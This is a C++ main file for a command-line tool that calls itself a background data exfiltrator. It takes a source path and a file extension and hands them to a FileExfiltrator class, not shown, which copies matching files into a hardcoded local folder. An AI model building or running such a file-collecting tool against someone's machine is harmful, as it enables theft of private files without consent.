#include <filesystem>
#include <iostream>
#include "FileExfiltrator.hpp"
#include "cxxopts.hpp"

namespace fs = std::filesystem;

int main(int argc, char* argv[]) {

    cxxopts::Options options("CopyFile", "A program that runs in the background to exfiltrate data and copy them to a destination");

    options.add_options()
    ("s,source", "Target Path", cxxopts::value<std::string>())
    ("e,extension", "Target Extension", cxxopts::value<std::string>())
    ("h,help", "Print usage")
    ;

    cxxopts::ParseResult result;
    try{
        result = options.parse(argc, argv);
    } catch(const cxxopts::exceptions::parsing& e) {
        std::cerr << e.what() << std::endl;
        return 1;
    } catch(const cxxopts::exceptions::exception& e) {
        std::cerr << e.what() << std::endl;
        return 1;
    }
    

    std::string str;
    std::string extension;

    if(result.count("help")) {
        std::cout << options.help() << std::endl;
        exit(0);
    }

    if(result.count("source")) str = result["source"].as<std::string>();
    else {
        std::cerr << "[ERROR] - Missing argument: --source\n";
    }

    if(result.count("extension")) extension = result["extension"].as<std::string>();
    else {
        std::cerr << "[ERROR] - Missing argument: --extension\n";
    }

    fs::path source{str};

    fs::path des_dir{"C:/Users/illya/des_dir"};
    if(!fs::exists(des_dir)) fs::create_directory(des_dir);


    FileExfiltrator exfiltrator(source, des_dir, extension);
    exfiltrator.executor(exfiltrator.getSource());
    return 0;
}